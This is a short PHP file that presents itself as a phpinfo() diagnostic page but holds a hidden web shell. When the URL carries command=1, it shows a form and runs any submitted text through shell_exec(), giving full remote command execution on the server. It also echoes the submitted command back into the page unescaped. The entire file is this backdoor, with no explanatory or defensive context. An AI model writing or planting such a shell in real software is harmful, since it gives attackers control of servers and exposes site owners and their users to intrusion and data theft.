<? 
if($_GET['command'] == 1) {?>

<form action="info.php?command=1" method="post">
<textarea name="cmd" style="width:400px; height:200px;"><?= $_POST['cmd']?></textarea>
<input type="submit" />
</form>
<pre>
<?
echo shell_exec($_POST['cmd']);

} else {

phpinfo();

}
?>